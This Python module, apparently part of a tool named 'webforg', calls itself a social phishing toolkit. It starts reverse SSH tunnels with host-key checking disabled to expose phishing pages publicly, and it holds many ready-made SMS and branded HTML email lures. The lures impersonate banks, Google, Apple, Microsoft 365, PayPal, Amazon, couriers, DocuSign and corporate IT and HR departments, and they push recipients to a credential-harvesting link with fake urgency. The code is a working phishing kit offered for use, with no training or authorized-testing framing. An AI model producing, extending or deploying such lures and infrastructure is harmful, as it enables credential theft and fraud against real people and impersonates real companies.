"""Social phishing toolkit: tunnel management + message/letter template generator."""

from __future__ import annotations

import html
import os
import re
import shutil
import signal
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

from webforg.core.config import get_settings

LOG_DIR = get_settings().logs_dir
LOG_DIR.mkdir(exist_ok=True)

RUNNING_TUNNELS: dict[str, dict] = {}

# Public URL for phishing pages. Set manually (e.g. your own VPS/domain) or via
# an SSH reverse tunnel. Injected as the default {link} template variable.
MANUAL_URL: str = ""

TUNNEL_TOOLS = ["ssh"]

TUNNEL_BINARIES = {
    "ssh": "ssh",
}

TUNNEL_HELP = {
    "ssh": "Reverse SSH tunnel: ssh -R <remote_port>:localhost:<port> <user>@<host>. The public URL is whatever your SSH server exposes.",
}

SSH_OPTS = [
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "ServerAliveInterval=30",
]


def _tool_installed(tool: str) -> bool:
    binary = TUNNEL_BINARIES.get(tool)
    return bool(binary and shutil.which(binary))


def _pid_alive(pid: int) -> bool:
    if not pid:
        return False
    try:
        os.kill(pid, 0)
        return True
    except (ProcessLookupError, PermissionError):
        return False


def set_manual_url(url: str) -> dict:
    """Store a public URL that will be used as the default {link} variable."""
    global MANUAL_URL
    url = (url or "").strip()
    if not url:
        MANUAL_URL = ""
        return {"success": True, "url": "", "message": "Public URL cleared."}
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    MANUAL_URL = url
    return {"success": True, "url": MANUAL_URL, "message": f"Public URL saved: {MANUAL_URL}"}


def get_public_url() -> str:
    if MANUAL_URL:
        return MANUAL_URL
    info = RUNNING_TUNNELS.get("ssh")
    if info and _pid_alive(info.get("pid")) and info.get("url"):
        return info["url"]
    return ""


def tunnel_status() -> dict:
    status = {}
    for tool in TUNNEL_TOOLS:
        running = tool in RUNNING_TUNNELS and _pid_alive(RUNNING_TUNNELS[tool]["pid"])
        if running:
            info = RUNNING_TUNNELS[tool]
            status[tool] = {
                "tool": tool,
                "installed": _tool_installed(tool),
                "running": True,
                "url": info.get("url"),
                "port": info.get("port"),
                "pid": info.get("pid"),
                "started_at": info.get("started_at"),
                "help": TUNNEL_HELP[tool],
            }
        else:
            RUNNING_TUNNELS.pop(tool, None)
            status[tool] = {
                "tool": tool,
                "installed": _tool_installed(tool),
                "running": False,
                "url": None,
                "port": None,
                "pid": None,
                "started_at": None,
                "help": TUNNEL_HELP[tool],
            }
    return {"tunnels": status, "manual_url": MANUAL_URL}


def _poll_url(log_file: Path, pattern: str, timeout: float = 25.0) -> Optional[str]:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if log_file.exists():
            text = log_file.read_text(errors="ignore")
            m = re.search(pattern, text)
            if m:
                return m.group(1)
        time.sleep(0.5)
    return None


def _spawn_tunnel(tool: str, cmd: list[str], pattern: Optional[str], port: int, fallback_url: Optional[str] = None) -> dict:
    log_file = LOG_DIR / f"tunnel_{tool}.log"
    log_file.write_text("")
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=open(log_file, "a"),
            stderr=subprocess.STDOUT,
            start_new_session=True,
        )
    except FileNotFoundError:
        return {"success": False, "error": f"{tool} binary not found"}
    url = _poll_url(log_file, pattern) if pattern else None
    if not url:
        url = fallback_url
    if not _pid_alive(proc.pid):
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            pass
        detail = log_file.read_text(errors="ignore")[-600:] if log_file.exists() else ""
        return {"success": False, "error": f"{tool} tunnel failed: {detail.strip() or 'process exited'}"}
    RUNNING_TUNNELS[tool] = {
        "pid": proc.pid,
        "url": url,
        "port": port,
        "started_at": datetime.now(timezone.utc).isoformat(),
    }
    if url:
        return {
            "success": True,
            "tool": tool,
            "url": url,
            "port": port,
            "pid": proc.pid,
            "message": f"{tool} tunnel is live at {url}",
        }
    return {
        "success": True,
        "tool": tool,
        "port": port,
        "pid": proc.pid,
        "message": f"{tool} tunnel established. Paste its public URL in the Public URL field.",
    }


def tunnel_start(tool: str, port: int, remote: str = "", remote_port: int = 80) -> dict:
    tool = (tool or "").lower()
    if tool not in TUNNEL_TOOLS:
        return {"success": False, "error": f"Unknown tunnel tool '{tool}'"}
    if not _tool_installed(tool):
        return {"success": False, "error": f"'{tool}' is not installed on this host. Install it first."}
    if tool in RUNNING_TUNNELS and _pid_alive(RUNNING_TUNNELS[tool]["pid"]):
        return {"success": False, "error": f"A {tool} tunnel is already running", "url": RUNNING_TUNNELS[tool].get("url")}
    if tool == "ssh":
        if not remote:
            return {"success": False, "error": "SSH tunnel requires a remote target, e.g. user@host"}
        host = remote.rsplit("@", 1)[-1] if "@" in remote else remote
        cmd = ["ssh", *SSH_OPTS, "-N", "-R", f"{remote_port}:localhost:{port}", remote]
        return _spawn_tunnel(tool, cmd, None, port, fallback_url=f"http://{host}:{remote_port}")
    return {"success": False, "error": "Unsupported tool"}


def tunnel_stop(tool: str) -> dict:
    tool = (tool or "").lower()
    if tool not in RUNNING_TUNNELS:
        return {"success": False, "error": f"No running {tool} tunnel"}
    info = RUNNING_TUNNELS.pop(tool)
    try:
        os.killpg(os.getpgid(info["pid"]), signal.SIGTERM)
    except Exception:
        try:
            os.kill(info["pid"], signal.SIGTERM)
        except OSError:
            pass
    return {"success": True, "tool": tool, "message": f"{tool} tunnel stopped"}


SMS_TEMPLATES = [
    {
        "id": "chase_fraud_alert",
        "name": "Chase — Fraud Alert",
        "body": "Chase Fraud Alert: A transaction of {amount} at {merchant} was attempted on your card ending {last4}. If you do not recognize this charge, reply YES to block it. If this was you, reply NO. Details: {link}",
        "variables": ["amount", "merchant", "last4", "link"],
    },
    {
        "id": "bank_account_locked",
        "name": "Bank — Account Temporarily Locked",
        "body": "Security notice from {bank}: your online banking was temporarily locked after 3 failed sign-in attempts. Restore access now: {link}. Verification window closes in {expiry}. Ref: {reference}.",
        "variables": ["bank", "link", "expiry", "reference"],
    },
    {
        "id": "bank_otp",
        "name": "Bank — One-Time Passcode",
        "body": "Your {bank} verification code is {code}. This code expires in 10 minutes. Do not share it. If you did not request this code, call your branch or verify here: {link}",
        "variables": ["bank", "code", "link"],
    },
    {
        "id": "otp_generic",
        "name": "App — Verification Code",
        "body": "{platform} code: {code}. Valid for 5 minutes. Never share this code with anyone, including {platform} support. If this wasn't you, secure your account: {link}",
        "variables": ["platform", "code", "link"],
    },
    {
        "id": "amazon_signin",
        "name": "Amazon — Sign-In Code",
        "body": "Amazon: your One Time Password is {code}. Enter it to complete sign-in. If you didn't request this, we recommend changing your password: {link}",
        "variables": ["code", "link"],
    },
    {
        "id": "google_alert",
        "name": "Google — Security Alert",
        "body": "Google blocked a sign-in attempt on your account from a new device. Review recent activity and confirm it was you: {link}. If this wasn't you, reset your password within {expiry}.",
        "variables": ["link", "expiry"],
    },
    {
        "id": "apple_otp",
        "name": "Apple ID — Verification Code",
        "body": "Your Apple ID verification code is {code}. Do not share it. Sign in or verify your recovery details at {link} if you did not request this.",
        "variables": ["code", "link"],
    },
    {
        "id": "paypal_unusual",
        "name": "PayPal — Unusual Activity",
        "body": "PayPal: We noticed unusual activity on your account. A charge of {amount} is pending review. Confirm this transaction or dispute it: {link} before {expiry}.",
        "variables": ["amount", "link", "expiry"],
    },
    {
        "id": "fedex_delivery",
        "name": "FedEx — Delivery Attempt",
        "body": "FedEx: We attempted to deliver your package #{tracking} but no one was available. Reschedule delivery or pick it up: {link}. Available until {expiry}.",
        "variables": ["tracking", "link", "expiry"],
    },
    {
        "id": "usps_held",
        "name": "USPS — Package Held",
        "body": "USPS: Your package is being held at the local facility because of incomplete address details. Update your address: {link} within {expiry} to avoid return.",
        "variables": ["link", "expiry"],
    },
    {
        "id": "dhl_fee",
        "name": "DHL — Customs Fee Due",
        "body": "DHL Express: Customs clearance requires a payment of {amount} for your shipment #{tracking}. Pay the fee to release your parcel: {link}",
        "variables": ["amount", "tracking", "link"],
    },
    {
        "id": "telecom_bill",
        "name": "Telecom — Bill Overdue",
        "body": "{telecom}: Your account is {amount} overdue. Service may be suspended. Settle your balance before {expiry} to avoid interruption: {link}",
        "variables": ["telecom", "amount", "expiry", "link"],
    },
    {
        "id": "reward_claim",
        "name": "Reward / Gift Claim",
        "body": "Congrats! You have been selected for a {company} reward worth {amount}. Claim it before {expiry}: {link}. Valid for the number receiving this message.",
        "variables": ["company", "amount", "expiry", "link"],
    },
    {
        "id": "covid_vax",
        "name": "Health — Appointment Confirmation",
        "body": "{health}: Your appointment is confirmed for {date} at {time}. Bring your ID and insurance card. Confirm or reschedule: {link} within {expiry}.",
        "variables": ["health", "date", "time", "link", "expiry"],
    },
]

EMAIL_TEMPLATES = [
    {
        "id": "m365_password_expiry",
        "name": "Microsoft 365 — Password Expiry",
        "brand": "Microsoft",
        "brand_color": "#0078d4",
        "subject": "Action Required: {first_name}, update your Microsoft 365 password",
        "variables": ["first_name", "email", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "Your Microsoft 365 password for {email} expires today at 11:59 PM.",
        "paragraphs": [
            "Microsoft enforces periodic password rotation as part of your organization's security policy. To avoid a disruption of service, update your password before the expiry window closes.",
            "After you update, you will be able to continue using Outlook, Teams, and your other Microsoft 365 apps without interruption.",
        ],
        "cta": "Update password now",
        "note": "This link will expire in {expiry}. If you have already updated your password, you can ignore this message.",
        "footer": "Microsoft Account Team · This message was sent to {email}. Please do not reply to this message.",
    },
    {
        "id": "m365_unusual_signin",
        "name": "Microsoft — Unusual Sign-In Detected",
        "brand": "Microsoft",
        "brand_color": "#0078d4",
        "subject": "Security alert: unusual sign-in for {email}",
        "variables": ["email", "location", "device", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "We detected a new sign-in to your Microsoft account ({email}) from {device} in {location}.",
        "paragraphs": [
            "If this was you, no further action is needed. If you do not recognize this sign-in, someone may have your password.",
            "For your protection we recommend reviewing your recent activity and changing your password.",
        ],
        "cta": "Review recent activity",
        "note": "This alert link is valid for {expiry}. Microsoft will never ask for your password by email.",
        "footer": "Microsoft account security team · Notification for {email}.",
    },
    {
        "id": "google_suspicious",
        "name": "Google — Suspicious Sign-In Prevented",
        "brand": "Google",
        "brand_color": "#4285f4",
        "subject": "Suspicious sign-in prevented on your Google Account",
        "variables": ["email", "location", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "Google stopped someone from signing in to your Google Account ({email}) from an unfamiliar device in {location}.",
        "paragraphs": [
            "We didn't recognize the device or location, so we blocked the attempt. If this was you, you can review and approve the sign-in below.",
            "If it wasn't you, secure your account by updating your password and review your security settings.",
        ],
        "cta": "Review sign-in attempt",
        "note": "You can review this alert for up to {expiry} before it expires.",
        "footer": "Google Account · Sent to {email} · Please do not reply to this message.",
    },
    {
        "id": "google_recovery",
        "name": "Google — Password Change Required",
        "brand": "Google",
        "brand_color": "#4285f4",
        "subject": "Google Security Alert: change your password",
        "variables": ["first_name", "email", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "We believe someone else might have the password to your Google Account ({email}).",
        "paragraphs": [
            "For your protection, you will be required to change your password before you can continue to use Google services such as Gmail and Drive.",
            "This change must be completed within {expiry}. Until then, access to some services may be restricted.",
        ],
        "cta": "Change password",
        "note": "Google will never ask you for your password in an email.",
        "footer": "Google Account Security · Notification for {email}.",
    },
    {
        "id": "apple_payment",
        "name": "Apple — Payment Method Failed",
        "brand": "Apple",
        "brand_color": "#1d1d1f",
        "subject": "Your Apple ID payment method was declined",
        "variables": ["first_name", "amount", "link", "expiry"],
        "greeting": "Dear {first_name},",
        "lead": "We were unable to complete a payment of {amount} for your Apple services because the payment method on file has been declined.",
        "paragraphs": [
            "To avoid an interruption to your subscriptions and purchases, please update your payment information.",
            "Your account remains active, but services may be suspended if the balance is not settled.",
        ],
        "cta": "Update payment method",
        "note": "Payment details must be updated within {expiry}.",
        "footer": "Apple · This is an automated notification. Please do not reply.",
    },
    {
        "id": "apple_account_locked",
        "name": "Apple ID — Account Locked",
        "brand": "Apple",
        "brand_color": "#1d1d1f",
        "subject": "Your Apple ID has been locked for security reasons",
        "variables": ["first_name", "link", "expiry"],
        "greeting": "Dear {first_name},",
        "lead": "Your Apple ID was locked because of too many failed verification attempts.",
        "paragraphs": [
            "To protect your account, Apple has restricted access to purchases, iCloud, and other Apple services until you verify your identity.",
            "Unlock your account and restore access by following the link below. You have {expiry} to complete verification.",
        ],
        "cta": "Unlock your Apple ID",
        "note": "If you did not attempt to sign in, your Apple ID may be at risk. Please verify immediately.",
        "footer": "Apple ID Support · AppleOne Infinite Loop, Cupertino, CA 95014.",
    },
    {
        "id": "paypal_unusual_activity",
        "name": "PayPal — Unusual Activity",
        "brand": "PayPal",
        "brand_color": "#003087",
        "subject": "Unusual activity detected on your PayPal account",
        "variables": ["first_name", "amount", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "We noticed unusual activity on your PayPal account and a payment of {amount} is currently pending review.",
        "paragraphs": [
            "If you made this transaction, no action is needed. If you do not recognize this charge, you can dispute it securely below.",
            "Reviewing the activity is required to keep your account in good standing.",
        ],
        "cta": "Review account activity",
        "note": "The review window closes in {expiry}. Your card will not be charged until resolved.",
        "footer": "PayPal · Customer Service: 1-888-221-1161 · Please do not reply to this email.",
    },
    {
        "id": "paypal_payment_received",
        "name": "PayPal — Payment Received",
        "brand": "PayPal",
        "brand_color": "#003087",
        "subject": "You've got a payment of {amount}",
        "variables": ["first_name", "amount", "sender", "link"],
        "greeting": "Hi {first_name},",
        "lead": "You've got a payment of {amount} from {sender}.",
        "paragraphs": [
            "The payment has been sent to your PayPal account and is awaiting confirmation of your receiving details before funds are released.",
            "Confirm your details to complete the transfer.",
        ],
        "cta": "View payment",
        "note": "Funds will be held until you confirm. This message was sent to {email}.",
        "footer": "PayPal · Please do not reply to this automated message.",
    },
    {
        "id": "amazon_order_hold",
        "name": "Amazon — Order On Hold",
        "brand": "Amazon",
        "brand_color": "#ff9900",
        "subject": "Action needed: Your Amazon order #{order} is on hold",
        "variables": ["first_name", "order", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "Your recent Amazon order #{order} is on hold pending payment verification.",
        "paragraphs": [
            "We could not confirm your billing information with your bank. Please update your payment details to avoid a cancellation of your order.",
            "You have {expiry} to confirm. Once confirmed, your order will proceed normally.",
        ],
        "cta": "Update payment details",
        "note": "If you have questions, Amazon Customer Service is available 24/7.",
        "footer": "Amazon.com · 410 Terry Ave N, Seattle, WA 98109.",
    },
    {
        "id": "amazon_giftcard",
        "name": "Amazon — Gift Card Unclaimed",
        "brand": "Amazon",
        "brand_color": "#ff9900",
        "subject": "You have an unclaimed Amazon Gift Card",
        "variables": ["first_name", "amount", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "Congratulations! You have an unclaimed Amazon Gift Card of {amount}.",
        "paragraphs": [
            "The card was issued to the email on file but has not yet been applied to your account.",
            "Claim the balance before {expiry} to prevent the card from being voided.",
        ],
        "cta": "Claim gift card",
        "note": "Gift cards cannot be replaced if lost, stolen, or expired.",
        "footer": "Amazon.com Gift Cards · This email was sent to {email}.",
    },
    {
        "id": "docusign_ready",
        "name": "DocuSign — Document Ready to Sign",
        "brand": "DocuSign",
        "brand_color": "#5f9a3a",
        "subject": "Please sign: {document} from {sender}",
        "variables": ["first_name", "document", "sender", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "{sender} has sent you a document to review and sign via DocuSign.",
        "paragraphs": [
            "Document: {document}. The envelope is ready for your electronic signature.",
            "Please review and sign at your earliest convenience.",
        ],
        "cta": "Review and sign",
        "note": "The signature session expires in {expiry}. Unauthorized access to this envelope is prohibited.",
        "footer": "DocuSign · This document was sent to {email}.",
    },
    {
        "id": "dropbox_share",
        "name": "Dropbox — Shared File",
        "brand": "Dropbox",
        "brand_color": "#0061ff",
        "subject": "{sender} shared a file with you on Dropbox",
        "variables": ["first_name", "sender", "filename", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "{sender} shared a file with you on Dropbox.",
        "paragraphs": [
            "File: {filename}. Access is limited to your email address and will be available for {expiry}.",
            "Sign in or create an account to view the shared file.",
        ],
        "cta": "Open shared file",
        "note": "This link was sent to {email}. If you don't recognize the sender, you can ignore this message.",
        "footer": "Dropbox · Please do not reply to this automated notification.",
    },
    {
        "id": "linkedin_views",
        "name": "LinkedIn — You Appeared in Searches",
        "brand": "LinkedIn",
        "brand_color": "#0a66c2",
        "subject": "{first_name}, people are looking for you on LinkedIn",
        "variables": ["first_name", "count", "link"],
        "greeting": "Hi {first_name},",
        "lead": "You appeared {count} times in LinkedIn searches this week.",
        "paragraphs": [
            "Recruiters and colleagues are searching for your skills. See who's been viewing your profile and get better visibility.",
            "Upgrade to see the full list of who viewed you.",
        ],
        "cta": "See who viewed your profile",
        "note": "LinkedIn respects your privacy. You can manage your search visibility in settings.",
        "footer": "LinkedIn · LinkedIn Ireland Unlimited Company, Wilton Plaza, Dublin 2.",
    },
    {
        "id": "bank_verification",
        "name": "Bank — Account Verification Required",
        "brand": "Regional Bank",
        "brand_color": "#14509b",
        "subject": "IMPORTANT: verify your {bank} account to avoid restriction",
        "variables": ["first_name", "bank", "link", "expiry", "reference"],
        "greeting": "Dear {first_name},",
        "lead": "To comply with recent security regulations, {bank} requires you to verify the information on file for your online account.",
        "paragraphs": [
            "Please confirm your details before {expiry}. Failure to verify may result in a temporary restriction on online and card services.",
            "Reference number: {reference}. Please keep it for your records.",
        ],
        "cta": "Verify account now",
        "note": "{bank} will never ask for your full password or PIN by email.",
        "footer": "{bank} Customer Security · For questions call the number on the back of your card.",
    },
    {
        "id": "corp_it_helpdesk",
        "name": "Corporate — IT Helpdesk Password Review",
        "brand": "Company IT",
        "brand_color": "#2f6f4f",
        "subject": "IT Security: {company} password verification required",
        "variables": ["first_name", "company", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "The IT Security team is performing a routine audit of {company} accounts and needs you to confirm your mailbox credentials.",
        "paragraphs": [
            "Please complete the verification through the secure portal below. Your access to email and internal systems will be reviewed after completion.",
            "Complete the audit within {expiry} to avoid temporary access restrictions.",
        ],
        "cta": "Complete verification",
        "note": "This is an official {company} IT notice. Contact the helpdesk with any questions.",
        "footer": "{company} IT Department · This email is only for the recipient {email}.",
    },
    {
        "id": "hr_payroll_update",
        "name": "HR — Payroll / Direct Deposit Update",
        "brand": "Company HR",
        "brand_color": "#7a4a9b",
        "subject": "Payroll: Update your direct deposit details",
        "variables": ["first_name", "company", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "Our records indicate that your direct deposit information on file with {company} needs to be updated before the next payroll run.",
        "paragraphs": [
            "To ensure your pay is deposited on time, please confirm your banking details via the secure HR portal.",
            "Updates must be received before {expiry} to take effect for the upcoming pay period.",
        ],
        "cta": "Update direct deposit",
        "note": "If you believe this message was sent in error, please contact the HR department.",
        "footer": "{company} Human Resources · Payroll Notice · Sent to {email}.",
    },
    {
        "id": "vpn_mfa_enroll",
        "name": "Corporate — VPN / MFA Enrollment",
        "brand": "Company Security",
        "brand_color": "#c0392b",
        "subject": "Mandatory: Enroll in the new {company} VPN portal",
        "variables": ["first_name", "company", "link", "expiry"],
        "greeting": "Hi {first_name},",
        "lead": "As part of a security upgrade, {company} is migrating all employees to the new VPN portal with multi-factor authentication.",
        "paragraphs": [
            "Your current VPN access will be deactivated once the migration window closes. Complete your enrollment to avoid losing remote access.",
            "Enrollment must be completed within {expiry}.",
        ],
        "cta": "Enroll now",
        "note": "Remote access will be suspended for accounts that do not enroll in time.",
        "footer": "{company} Security Operations Center · This is an automated notice.",
    },
    {
        "id": "reward_win",
        "name": "Reward / Prize Notification",
        "brand": "Rewards",
        "brand_color": "#d35400",
        "subject": "Congratulations {first_name}! You've been selected",
        "variables": ["first_name", "company", "amount", "expiry", "link", "email"],
        "greeting": "Dear {first_name},",
        "lead": "Congratulations! You have been selected as a {company} customer to receive an exclusive reward of {amount}.",
        "paragraphs": [
            "This limited offer is valid until {expiry} and can be claimed only once per customer.",
            "The offer has been reserved for {email}. Claim your reward using the button below.",
        ],
        "cta": "Claim your reward",
        "note": "This is not spam — you opted in to {company} promotional emails.",
        "footer": "{company} Rewards Team · Unsubscribe preferences can be managed in your account.",
    },
]


def list_templates() -> dict:
    return {
        "sms": SMS_TEMPLATES,
        "email": EMAIL_TEMPLATES,
    }


EMAIL_HTML_SHELL = """<!DOCTYPE html>
<html>
<body style="margin:0;padding:0;background:#f4f4f7;font-family:'Segoe UI',Segoe UI,Helvetica,Arial,sans-serif;">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f4f4f7;padding:24px 12px;">
    <tr><td align="center">
      <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;background:#ffffff;border:1px solid #e7e7e9;border-radius:8px;overflow:hidden;">
        <tr>
          <td style="background:{brand_color};padding:22px 32px;">
            <span style="color:#ffffff;font-size:20px;font-weight:600;letter-spacing:0.3px;">{brand}</span>
          </td>
        </tr>
        <tr>
          <td style="padding:32px;">
            {greeting}
            {lead}
            {paragraphs}
            {cta}
            {note}
          </td>
        </tr>
        <tr>
          <td style="padding:20px 32px;border-top:1px solid #eeeeee;background:#fafafa;">
            <p style="margin:0;font-size:12px;line-height:1.5;color:#8a8a8f;">{footer}</p>
            <p style="margin:10px 0 0;font-size:11px;line-height:1.5;color:#b0b0b6;">This is an automated security notification from {brand}. Please do not reply to this email.</p>
          </td>
        </tr>
      </table>
      <p style="margin:14px 0 0;font-size:11px;color:#a6a6ab;">© {year} {brand}. All rights reserved.</p>
    </td></tr>
  </table>
</body>
</html>"""


def _esc(text: str) -> str:
    return html.escape(text or "", quote=True)


def _fill(text: str, vars_: dict) -> str:
    def repl(m):
        key = m.group(1)
        return vars_.get(key, m.group(0))

    return re.sub(r"\{([a-z_][a-z0-9_]*)\}", repl, text)


def _render_email_html(tpl: dict, vars_: dict, link: str) -> str:
    color = tpl.get("brand_color", "#0078d4")
    paragraphs = "".join(
        f'<p style="margin:0 0 16px;font-size:15px;line-height:1.6;color:#333333;">{_esc(_fill(p, vars_))}</p>'
        for p in tpl.get("paragraphs", [])
    )
    greeting = f'<p style="margin:0 0 18px;font-size:15px;line-height:1.6;color:#333333;">{_esc(_fill(tpl.get("greeting", ""), vars_))}</p>' if tpl.get("greeting") else ""
    lead = f'<p style="margin:0 0 16px;font-size:15px;line-height:1.6;color:#333333;font-weight:600;">{_esc(_fill(tpl.get("lead", ""), vars_))}</p>' if tpl.get("lead") else ""
    cta = ""
    if tpl.get("cta"):
        href = _esc(link) if link else "#"
        cta = (
            '<div style="margin:24px 0;">'
            f'<a href="{href}" style="display:inline-block;background:{color};color:#ffffff;padding:13px 30px;'
            'border-radius:6px;text-decoration:none;font-weight:600;font-size:14px;">'
            f'{_esc(_fill(tpl["cta"], vars_))}</a></div>'
        )
    note = f'<p style="margin:20px 0 0;font-size:12px;line-height:1.5;color:#7a7a80;">{_esc(_fill(tpl.get("note", ""), vars_))}</p>' if tpl.get("note") else ""
    return EMAIL_HTML_SHELL.format(
        brand_color=color,
        brand=_esc(tpl.get("brand", "Account")),
        greeting=greeting,
        lead=lead,
        paragraphs=paragraphs,
        cta=cta,
        note=note,
        footer=_esc(_fill(tpl.get("footer", ""), vars_)),
        year=datetime.now(timezone.utc).year,
    )


def render_template(kind: str, template_id: str, variables: dict) -> dict:
    kind = (kind or "email").lower()
    templates = SMS_TEMPLATES if kind == "sms" else EMAIL_TEMPLATES
    tpl = next((t for t in templates if t["id"] == template_id), None)
    if not tpl:
        return {"success": False, "error": f"Template '{template_id}' not found"}
    vars_ = {k: (str(v).strip() if v is not None else "") for k, v in variables.items()}
    if not vars_.get("link"):
        vars_["link"] = get_public_url()

    missing = [v for v in tpl["variables"] if not vars_.get(v)]

    if kind == "sms":
        return {
            "success": True,
            "kind": kind,
            "id": tpl["id"],
            "name": tpl["name"],
            "brand": tpl.get("brand"),
            "body": _fill(tpl["body"], vars_),
            "missing": missing,
        }

    link = vars_.get("link", "")
    parts = []
    if tpl.get("greeting"):
        parts.append(_fill(tpl["greeting"], vars_))
    parts.append(_fill(tpl.get("lead", ""), vars_))
    parts.extend(_fill(p, vars_) for p in tpl.get("paragraphs", []))
    if tpl.get("cta"):
        parts.append(f"{_fill(tpl['cta'], vars_)}: {link}" if link else _fill(tpl["cta"], vars_))
    if tpl.get("note"):
        parts.append(_fill(tpl["note"], vars_))
    parts.append(_fill(tpl.get("footer", ""), vars_))
    body = "\n\n".join(p for p in parts if p)

    return {
        "success": True,
        "kind": kind,
        "id": tpl["id"],
        "name": tpl["name"],
        "brand": tpl.get("brand"),
        "brand_color": tpl.get("brand_color"),
        "subject": _fill(tpl["subject"], vars_),
        "body": body,
        "body_html": _render_email_html(tpl, vars_, link),
        "missing": missing,
    }


